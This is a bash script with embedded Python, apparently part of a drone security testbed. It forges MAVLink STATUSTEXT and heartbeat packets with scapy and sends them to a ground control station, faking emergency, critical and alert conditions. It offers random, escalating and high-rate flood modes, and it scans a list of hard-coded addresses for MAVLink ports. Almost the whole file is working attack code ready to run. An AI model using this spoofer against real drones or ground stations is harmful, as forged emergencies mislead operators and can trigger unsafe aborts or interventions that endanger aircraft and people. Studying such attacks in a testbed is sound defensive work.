#!/bin/bash
# emergency_status_spoofing_attack.sh - 드론 응급 상황 메시지 스푸핑 공격
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/protocol_tampering/emergency_status_spoofing_attack.sh
# Purpose: MAVLink STATUSTEXT 메시지 조작으로 GCS에게 가짜 응급 상황 전송

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Emergency Status Spoofing Attack"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}      Emergency Status Spoofing Attack    ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

execute_emergency_spoofing() {
    local target_host=${1:-"127.0.0.1"}
    local target_port=${2:-"14550"}
    local message_type=${3:-"random"}
    local duration=${4:-30}
    
    log_info "Starting emergency status spoofing attack"
    log_info "Target: ${target_host}:${target_port}"
    log_info "Message type: ${message_type}"
    log_info "Duration: ${duration} seconds"
    
    # Python 스크립트 생성 및 실행
    create_and_run_emergency_spoof "$target_host" "$target_port" "$message_type" "$duration"
    local result=$?
    
    if [ $result -eq 0 ]; then
        log_success "Emergency status spoofing attack completed successfully"
        return 0
    else
        log_error "Emergency status spoofing attack failed"
        return 1
    fi
}

create_and_run_emergency_spoof() {
    local target_host="$1"
    local target_port="$2"
    local message_type="$3"
    local duration="$4"
    
    log_info "Creating and executing emergency status spoofing attack..."
    
    python3 << PYEOF
from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random
import signal

class EmergencyStatusSpoofer:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.duration = int(duration)
        self.running = True
        self.packets_sent = 0
        self.start_time = time.time()
        
        # MAVLink 심각도 레벨별 응급 메시지
        self.emergency_messages = {
            # EMERGENCY (0) - 가장 높은 우선순위
            "emergency": [
                "EMERGENCY: Immediate action required",
                "EMERGENCY: Aircraft system failure",
                "EMERGENCY: Engine failure detected",
                "EMERGENCY: Fire alarm activated",
                "EMERGENCY: Collision imminent",
                "EMERGENCY: Structural damage detected",
                "EMERGENCY: Loss of flight control",
                "EMERGENCY: Critical battery failure",
                "EMERGENCY: GPS navigation failure",
                "EMERGENCY: Communication system down"
            ],
            
            # ALERT (1) - 높은 우선순위
            "alert": [
                "ALERT: Attention needed immediately",
                "ALERT: System malfunction detected",
                "ALERT: Low battery warning",
                "ALERT: Weather conditions critical",
                "ALERT: Airspace violation imminent",
                "ALERT: Sensor calibration required",
                "ALERT: Mission abort recommended",
                "ALERT: Manual control required",
                "ALERT: Geofence breach detected",
                "ALERT: High vibration levels"
            ],
            
            # CRITICAL (2) - 심각한 문제
            "critical": [
                "CRITICAL: Engine failure",
                "CRITICAL: IMU malfunction",
                "CRITICAL: Power system failure",
                "CRITICAL: Flight controller error",
                "CRITICAL: Telemetry link unstable",
                "CRITICAL: Servo malfunction",
                "CRITICAL: Temperature critical",
                "CRITICAL: Voltage drop detected",
                "CRITICAL: Memory corruption",
                "CRITICAL: Firmware error"
            ],
            
            # ERROR (3) - 오류 상황
            "error": [
                "ERROR: GPS signal lost",
                "ERROR: Compass calibration failed",
                "ERROR: Barometer malfunction",
                "ERROR: Radio communication error",
                "ERROR: Waypoint navigation failed",
                "ERROR: Sensor data invalid",
                "ERROR: Configuration error",
                "ERROR: Parameter load failed",
                "ERROR: Mission upload error",
                "ERROR: System initialization failed"
            ],
            
            # WARNING (4) - 경고
            "warning": [
                "WARNING: High temperature detected",
                "WARNING: Low signal strength",
                "WARNING: Battery degradation",
                "WARNING: Wind speed high",
                "WARNING: Altitude limit approached",
                "WARNING: Memory usage high",
                "WARNING: CPU overload",
                "WARNING: Sensor noise detected",
                "WARNING: Calibration drift",
                "WARNING: Communication delay"
            ],
            
            # NOTICE (5) - 알림
            "notice": [
                "NOTICE: System check complete",
                "NOTICE: Mission parameters updated",
                "NOTICE: Maintenance required",
                "NOTICE: Performance monitoring",
                "NOTICE: Data logging active",
                "NOTICE: Autopilot engaged",
                "NOTICE: GPS lock acquired",
                "NOTICE: Sensors initialized",
                "NOTICE: Configuration saved",
                "NOTICE: Flight mode changed"
            ],
            
            # INFO (6) - 정보
            "info": [
                "INFO: Battery at 50%",
                "INFO: Altitude 100m",
                "INFO: Speed 15 m/s",
                "INFO: GPS satellites 12",
                "INFO: Signal strength good",
                "INFO: Temperature normal",
                "INFO: All systems nominal",
                "INFO: Mission progress 75%",
                "INFO: Fuel remaining 60%",
                "INFO: Flight time 15 minutes"
            ],
            
            # DEBUG (7) - 디버그
            "debug": [
                "DEBUG: Diagnostic mode enabled",
                "DEBUG: Sensor readings updated",
                "DEBUG: Loop time 20ms",
                "DEBUG: Memory usage 45%",
                "DEBUG: Network latency 50ms",
                "DEBUG: PID values updated",
                "DEBUG: Kalman filter reset",
                "DEBUG: Logging rate 10Hz",
                "DEBUG: Buffer size 1024",
                "DEBUG: Thread priority normal"
            ]
        }
        
        # 심각도 레벨 매핑
        self.severity_levels = {
            "emergency": mavutil.mavlink.MAV_SEVERITY_EMERGENCY,
            "alert": mavutil.mavlink.MAV_SEVERITY_ALERT, 
            "critical": mavutil.mavlink.MAV_SEVERITY_CRITICAL,
            "error": mavutil.mavlink.MAV_SEVERITY_ERROR,
            "warning": mavutil.mavlink.MAV_SEVERITY_WARNING,
            "notice": mavutil.mavlink.MAV_SEVERITY_NOTICE,
            "info": mavutil.mavlink.MAV_SEVERITY_INFO,
            "debug": mavutil.mavlink.MAV_SEVERITY_DEBUG
        }
        
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        print(f"\\n[!] Attack interrupted. Sent {self.packets_sent} emergency messages.")
        self.running = False
        sys.exit(0)
    
    def create_statustext(self, severity, message):
        """응급 상태 텍스트 메시지 생성"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        # 메시지가 50자를 초과하면 자름
        if len(message) > 50:
            message = message[:47] + "..."
        
        return mav.statustext_encode(
            severity=severity,
            text=message.encode('utf-8')
        ).pack(mav)
    
    def create_heartbeat(self, system_status=mavutil.mavlink.MAV_STATE_ACTIVE):
        """시스템 상태를 반영하는 하트비트"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        return mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,
            system_status=system_status
        ).pack(mav)
    
    def send_mavlink_packet(self, packet_data):
        """UDP를 통한 MAVLink 패킷 전송"""
        try:
            packet = IP(dst=self.target_ip) / UDP(dport=self.target_port) / Raw(load=packet_data)
            send(packet, verbose=False)
            self.packets_sent += 1
            return True
        except Exception as e:
            print(f"[!] Packet send failed: {e}")
            return False
    
    def single_severity_spoof(self, severity_name):
        """단일 심각도 레벨의 메시지 스푸핑"""
        if severity_name not in self.severity_levels:
            print(f"[-] Unknown severity level: {severity_name}")
            print(f"[*] Available levels: {', '.join(self.severity_levels.keys())}")
            return False
        
        severity_level = self.severity_levels[severity_name]
        messages = self.emergency_messages[severity_name]
        
        print(f"[*] Spoofing {severity_name.upper()} messages")
        print(f"[*] Severity level: {severity_level}")
        print(f"[*] Message pool: {len(messages)} messages")
        
        packets_this_session = 0
        message_index = 0
        
        while self.running and (time.time() - self.start_time) < self.duration:
            # 메시지 순환 선택
            current_message = messages[message_index % len(messages)]
            message_index += 1
            
            # 상태 텍스트 메시지 전송
            if self.send_mavlink_packet(self.create_statustext(severity_level, current_message)):
                packets_this_session += 1
            
            # 심각한 상황의 경우 시스템 상태도 변경
            if severity_name in ["emergency", "critical"]:
                system_status = mavutil.mavlink.MAV_STATE_CRITICAL if severity_name == "critical" else mavutil.mavlink.MAV_STATE_EMERGENCY
                if self.send_mavlink_packet(self.create_heartbeat(system_status)):
                    packets_this_session += 1
            
            # 진행 상황 표시
            if packets_this_session % 20 == 0:
                elapsed = int(time.time() - self.start_time)
                remaining = self.duration - elapsed
                print(f"[*] Progress: {elapsed}s/{self.duration}s, "
                      f"packets sent: {self.packets_sent}, remaining: {remaining}s")
                print(f"    Last message: {current_message}")
            
            time.sleep(1)  # 1초마다 전송
        
        print(f"[+] {severity_name.upper()} spoofing completed. Total packets: {self.packets_sent}")
        return True
    
    def random_emergency_spoof(self):
        """무작위 응급 메시지 스푸핑"""
        print("[*] Starting random emergency message spoofing...")
        
        severity_names = list(self.severity_levels.keys())
        
        while self.running and (time.time() - self.start_time) < self.duration:
            # 무작위 심각도 레벨 선택 (응급상황에 가중치)
            if random.random() < 0.4:  # 40% 확률로 높은 심각도
                severity_name = random.choice(["emergency", "alert", "critical"])
            else:  # 60% 확률로 일반적인 심각도
                severity_name = random.choice(severity_names)
            
            severity_level = self.severity_levels[severity_name]
            messages = self.emergency_messages[severity_name]
            current_message = random.choice(messages)
            
            # 메시지 전송
            self.send_mavlink_packet(self.create_statustext(severity_level, current_message))
            
            # 높은 심각도의 경우 시스템 상태 변경
            if severity_name in ["emergency", "critical"]:
                system_status = mavutil.mavlink.MAV_STATE_CRITICAL if severity_name == "critical" else mavutil.mavlink.MAV_STATE_EMERGENCY
                self.send_mavlink_packet(self.create_heartbeat(system_status))
            
            if self.packets_sent % 15 == 0:
                elapsed = int(time.time() - self.start_time)
                print(f"[*] Random messages: {elapsed}s/{self.duration}s, "
                      f"current: {severity_name.upper()} - {current_message[:30]}...")
            
            # 응급 메시지는 더 자주, 일반 메시지는 덜 자주
            if severity_name in ["emergency", "alert", "critical"]:
                time.sleep(0.5)  # 0.5초마다
            else:
                time.sleep(2)    # 2초마다
        
        print(f"[+] Random emergency spoofing completed. Total packets: {self.packets_sent}")
        return True
    
    def escalating_emergency_spoof(self):
        """단계적으로 심각도가 증가하는 응급 상황 시뮬레이션"""
        print("[*] Starting escalating emergency simulation...")
        
        # 단계별 심각도 증가
        escalation_sequence = ["info", "notice", "warning", "error", "critical", "alert", "emergency"]
        phase_duration = self.duration // len(escalation_sequence)
        
        for i, severity_name in enumerate(escalation_sequence):
            if not self.running:
                break
            
            severity_level = self.severity_levels[severity_name]
            messages = self.emergency_messages[severity_name]
            
            print(f"\\n[*] Phase {i+1}: {severity_name.upper()} level")
            
            phase_start = time.time()
            packets_this_phase = 0
            
            while self.running and (time.time() - phase_start) < phase_duration:
                current_message = random.choice(messages)
                
                # 메시지 전송
                self.send_mavlink_packet(self.create_statustext(severity_level, current_message))
                packets_this_phase += 1
                
                # 심각한 상황에서는 시스템 상태도 변경
                if severity_name in ["emergency", "critical", "alert"]:
                    if severity_name == "emergency":
                        system_status = mavutil.mavlink.MAV_STATE_EMERGENCY
                    elif severity_name == "critical":
                        system_status = mavutil.mavlink.MAV_STATE_CRITICAL
                    else:
                        system_status = mavutil.mavlink.MAV_STATE_ACTIVE
                    
                    self.send_mavlink_packet(self.create_heartbeat(system_status))
                    packets_this_phase += 1
                
                if packets_this_phase % 10 == 0:
                    phase_elapsed = int(time.time() - phase_start)
                    print(f"    Phase progress: {phase_elapsed}s/{phase_duration}s")
                
                # 심각도에 따라 전송 빈도 조절
                if severity_name in ["emergency", "alert"]:
                    time.sleep(0.5)
                elif severity_name == "critical":
                    time.sleep(1)
                else:
                    time.sleep(2)
            
            print(f"[+] Phase {i+1} completed: {packets_this_phase} packets sent")
        
        print(f"[+] Escalating emergency simulation completed. Total packets: {self.packets_sent}")
        return True
    
    def emergency_flood_spoof(self):
        """응급 메시지 플러딩 공격"""
        print("[*] Starting emergency message flood attack...")
        
        # 가장 심각한 메시지들만 사용
        critical_severities = ["emergency", "alert", "critical"]
        
        while self.running and (time.time() - self.start_time) < self.duration:
            # 동시에 여러 심각한 메시지 전송
            for severity_name in critical_severities:
                if not self.running:
                    break
                
                severity_level = self.severity_levels[severity_name]
                messages = self.emergency_messages[severity_name]
                current_message = random.choice(messages)
                
                # 빠른 속도로 메시지 전송
                self.send_mavlink_packet(self.create_statustext(severity_level, current_message))
                
                # 응급 상태 하트비트
                self.send_mavlink_packet(self.create_heartbeat(mavutil.mavlink.MAV_STATE_EMERGENCY))
            
            if self.packets_sent % 30 == 0:
                elapsed = int(time.time() - self.start_time)
                rate = self.packets_sent / max(elapsed, 1)
                print(f"[*] Flood attack: {elapsed}s/{self.duration}s, "
                      f"rate: {rate:.1f} packets/sec")
            
            time.sleep(0.1)  # 매우 빠른 전송
        
        print(f"[+] Emergency flood attack completed. Total packets: {self.packets_sent}")
        return True

# 메인 실행 로직
target_ip = "$target_host"
target_port = int("$target_port")
message_type = "$message_type"
duration = int("$duration")

spoofer = EmergencyStatusSpoofer(target_ip, target_port, duration)

try:
    print(f"[*] Starting emergency status spoofing attack on {target_ip}:{target_port}")
    print(f"[*] Message type: {message_type}, Duration: {duration} seconds")
    print(f"[*] Press Ctrl+C to stop attack")
    print("")
    
    if message_type == "random":
        success = spoofer.random_emergency_spoof()
    elif message_type == "escalating":
        success = spoofer.escalating_emergency_spoof()
    elif message_type == "flood":
        success = spoofer.emergency_flood_spoof()
    elif message_type in spoofer.severity_levels:
        success = spoofer.single_severity_spoof(message_type)
    else:
        # 기본값: 무작위 응급 메시지
        success = spoofer.random_emergency_spoof()
    
    if success:
        print(f"\\n[+] Emergency status spoofing attack completed successfully")
        print(f"[+] Total emergency messages sent: {spoofer.packets_sent}")
        sys.exit(0)
    else:
        print(f"\\n[-] Emergency status spoofing attack failed")
        sys.exit(1)
        
except Exception as e:
    print(f"[-] Attack execution failed: {e}")
    sys.exit(1)
PYEOF
    
    return $?
}

# MAVLink 타겟 스캔
scan_mavlink_targets() {
    log_info "Scanning for MAVLink targets..."
    
    local common_targets=(
        "127.0.0.1:14550"
        "127.0.0.1:14551"
        "10.13.0.6:14550"
        "10.13.0.4:14550"
        "192.168.13.14:14550"
        "192.168.1.100:14550"
    )
    
    local found_targets=()
    
    for target in "${common_targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 2 nc -z "$ip" "$port" 2>/dev/null; then
            found_targets+=("$target")
            echo -e "${GREEN}Found MAVLink service: $target${NC}"
        fi
    done
    
    if [ ${#found_targets[@]} -eq 0 ]; then
        echo -e "${YELLOW}No live MAVLink targets found, using simulation mode${NC}"
        return 1
    fi
    
    return 0
}

# 메인 실행 함수
main() {
    print_attack_banner
    
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # 필수 도구 확인
    local required_tools=("python3")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        exit 1
    fi
    
    # Python 의존성 확인
    if ! python3 -c "import pymavlink, scapy" 2>/dev/null; then
        log_info "Installing Python dependencies..."
        pip3 install pymavlink scapy >/dev/null 2>&1
    fi
    
    # 사용자 옵션 처리
    local target_host="${1:-127.0.0.1}"
    local target_port="${2:-14550}"
    local message_type="${3:-random}"
    local duration="${4:-30}"
    
    # 사용법 출력
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "Usage: $0 [target_host] [target_port] [message_type] [duration]"
        echo "  target_host  : Target IP address (default: 127.0.0.1)"
        echo "  target_port  : Target MAVLink port (default: 14550)"
        echo "  message_type : Type of emergency messages (default: random)"
        echo "  duration     : Attack duration in seconds (default: 30)"
        echo ""
        echo "Message types:"
        echo "  emergency    : Emergency level messages only"
        echo "  alert        : Alert level messages only"
        echo "  critical     : Critical level messages only"
        echo "  error        : Error level messages only"
        echo "  warning      : Warning level messages only"
        echo "  notice       : Notice level messages only"
        echo "  info         : Info level messages only"
        echo "  debug        : Debug level messages only"
        echo "  random       : Random mix of all severity levels"
        echo "  escalating   : Gradually increasing severity levels"
        echo "  flood        : High-speed emergency message flooding"
        echo ""
        echo "Examples:"
        echo "  $0                                    # Random messages for 30s"
        echo "  $0 10.13.0.6 14550 emergency 60     # Emergency messages for 60s"
        echo "  $0 127.0.0.1 14550 escalating 120   # Escalating severity for 120s"
        echo "  $0 127.0.0.1 14550 flood 45         # Message flooding for 45s"
        echo ""
        echo "Target examples:"
        echo "  10.13.0.6:14550    - QGroundControl (Bridge)"
        echo "  192.168.13.14:14550 - MAVProxy (WiFi)"
        echo "  127.0.0.1:14550    - Local SITL"
        exit 0
    fi
    
    # 타겟 스캔 (정보용)
    scan_mavlink_targets
    
    # 공격 실행
    execute_emergency_spoofing "$target_host" "$target_port" "$message_type" "$duration"
    exit $?
}

# 직접 실행 시 메인 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi